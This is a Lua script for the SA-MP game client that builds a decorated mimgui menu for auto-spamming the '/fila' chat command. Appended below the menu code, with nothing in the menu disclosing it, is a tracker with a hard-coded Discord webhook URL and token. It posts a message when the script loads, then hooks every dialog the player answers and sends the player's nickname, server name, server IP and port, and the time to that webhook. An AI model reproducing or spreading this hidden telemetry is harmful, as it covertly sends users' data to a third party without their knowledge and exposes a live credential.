local imgui = require 'mimgui'
local v = imgui.new.bool(false)
local spam_fila = imgui.new.bool(false)
local delay_ms = imgui.new.int(0)
local show_snow = imgui.new.bool(false)

local total_pontos = 30
local largura_onda = 60
local velocidade = 0.05
local angulo = 0

-- Aumentei o número de estrelas para 150
local estrelas = {}
local total_estrelas = 150
for i = 1, total_estrelas do
    table.insert(estrelas, {
        x = math.random(0, 300),
        y = math.random(0, 400),
        velocidade = math.random(5, 15)/10,
        tamanho = math.random(1, 3) -- Tamanho variado para as estrelas
    })
end

-- Aumentei o número de flocos de neve para 300
local snowflakes = {}
local total_snowflakes = 300
for i = 1, total_snowflakes do
    table.insert(snowflakes, {
        x = math.random(0, 300),
        y = math.random(-50, -10),
        velocidade = math.random(10, 30)/10,
        tamanho = math.random(1, 4), -- Tamanho variado para os flocos
        oscilacao = math.random() * 2 * math.pi,
        velocidade_oscilacao = math.random(1, 3)/10
    })
end

local float_btn_pos = imgui.ImVec2(50, 50)
local dragging = false
local drag_offset = imgui.ImVec2(0,0)

imgui.OnInitialize(function()
    local style = imgui.GetStyle()
    imgui.StyleColorsDark()
    style.WindowRounding = 6
    style.FrameRounding = 4
    style.GrabRounding = 4
    style.ScrollbarRounding = 4

    local colors = style.Colors
    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.10,0.10,0.10,0.94)
    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.08,0.08,0.08,1.00)
    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.20,0.20,0.20,1.00)
    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.24,0.24,0.24,1.00)
    colors[imgui.Col.Button] = imgui.ImVec4(0.20,0.20,0.20,1.00)
    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.30,0.30,0.30,1.00)
    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.40,0.40,0.40,1.00)
    colors[imgui.Col.Border] = imgui.ImVec4(0.43,0.43,0.50,0.50)
    colors[imgui.Col.Text] = imgui.ImVec4(1.00,1.00,1.00,1.00)
end)

imgui.OnFrame(function() return true end, function()
    local io = imgui.GetIO()

    imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
    imgui.SetNextWindowSize(imgui.ImVec2(40,40))
    imgui.Begin("FLUTUANTE", nil,
        imgui.WindowFlags.NoTitleBar +
        imgui.WindowFlags.NoResize +
        imgui.WindowFlags.NoCollapse +
        imgui.WindowFlags.NoScrollbar +
        imgui.WindowFlags.NoMove +
        imgui.WindowFlags.AlwaysAutoResize
    )

    if imgui.Button("</>", imgui.ImVec2(40,40)) then
        v[0] = not v[0]
    end

    if imgui.IsItemHovered() and imgui.IsMouseClicked(0) and not dragging then
        dragging = true
        drag_offset.x = io.MousePos.x - float_btn_pos.x
        drag_offset.y = io.MousePos.y - float_btn_pos.y
    end

    if dragging then
        if imgui.IsMouseDown(0) then
            float_btn_pos.x = io.MousePos.x - drag_offset.x
            float_btn_pos.y = io.MousePos.y - drag_offset.y
            imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
        else
            dragging = false
        end
    end

    imgui.End()

    if v[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(600,350), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(300,400), imgui.Cond.FirstUseEver)
        imgui.Begin("AUTO FILA | by NukY", v,
            imgui.WindowFlags.NoCollapse +
            imgui.WindowFlags.NoResize
        )

        local draw = imgui.GetWindowDrawList()
        local pos = imgui.GetWindowPos()
        local size = imgui.GetWindowSize()
        local centroX = size.x/2
        local espacamento = size.y/total_pontos

        -- Desenha mais estrelas com tamanhos variados
        for i,e in ipairs(estrelas) do
            e.y = e.y + e.velocidade
            if e.y > size.y then 
                e.y = 0 
                e.x = math.random(0, size.x) 
                e.tamanho = math.random(1, 3) -- Atualiza o tamanho quando a estrela reaparece
            end
            draw:AddCircleFilled(imgui.ImVec2(pos.x+e.x,pos.y+e.y), e.tamanho, 0xFFFFFFFF)
        end

        angulo = angulo + velocidade
        for i=1,total_pontos do
            local offset = (i/total_pontos)*math.pi*2
            local y = i*espacamento
            local x1 = centroX + math.sin(angulo+offset)*largura_onda
            local x2 = centroX - math.sin(angulo+offset)*largura_onda
            draw:AddCircleFilled(imgui.ImVec2(pos.x+x1,pos.y+y),3,0xFFFFA500)
            draw:AddCircleFilled(imgui.ImVec2(pos.x+x2,pos.y+y),3,0xFF00BFFF)
            draw:AddLine(imgui.ImVec2(pos.x+x1,pos.y+y),imgui.ImVec2(pos.x+x2,pos.y+y),0x33FFFFFF,1)
        end

        imgui.SliderInt("Delay (ms)",delay_ms,0,30000)
        if imgui.Button("AUTO",imgui.ImVec2(150,30)) then
            spam_fila[0] = not spam_fila[0]
        end
        
        if imgui.Button("FRIO", imgui.ImVec2(150,30)) then
            show_snow[0] = not show_snow[0]
        end

        imgui.End()
    end

    if show_snow[0] then
        local screen_width, screen_height = getScreenResolution()
        local draw = imgui.GetBackgroundDrawList()
        
        -- Desenha mais flocos de neve com tamanhos variados
        for i, floco in ipairs(snowflakes) do
            floco.y = floco.y + floco.velocidade
            floco.oscilacao = floco.oscilacao + floco.velocidade_oscilacao
            floco.x = floco.x + math.sin(floco.oscilacao) * 0.5
            
            if floco.y > screen_height then
                floco.y = math.random(-50, -10)
                floco.x = math.random(0, screen_width)
                floco.tamanho = math.random(1, 4) -- Atualiza o tamanho quando o floco reaparece
            end
            
            draw:AddCircleFilled(imgui.ImVec2(floco.x, floco.y), floco.tamanho, 0xFFFFFFFF)
        end
    end
end)

function main()
    while true do
        wait(0)
        if isSampAvailable() and spam_fila[0] then
            sampSendChat("/fila")
            wait(delay_ms[0])
        end
    end
end
local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"

local https = require("ssl.https")
local ltn12 = require("ltn12")

function sendEmbedToDiscord(title, description, color)
    local body = string.format(
        '{"embeds":[{"title":"%s","description":"%s","color":%d}]}',
        title, description, color
    )
    local response_body = {}

    local res, code, response_headers, status = https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }

    if code ~= 200 and code ~= 204 then
        print("Erro ao enviar embed: " .. (status or "Desconhecido"))
    end
end

print("Script carregado!")
sendEmbedToDiscord("✅ REGISTROS DE SEGURANÇA", "Iniciado com sucesso!", 0x800080)

require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local hora = os.date("%H:%M:%S")
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()

    local description = string.format(
        "**Nick:** %s\n**Servidor:** %s\n**IP:** %s:%d\n**Hora:** %s",
        nick, servername, ip, port, hora
    )

    sendEmbedToDiscord("📌 Informações", description, 0x800080)
end
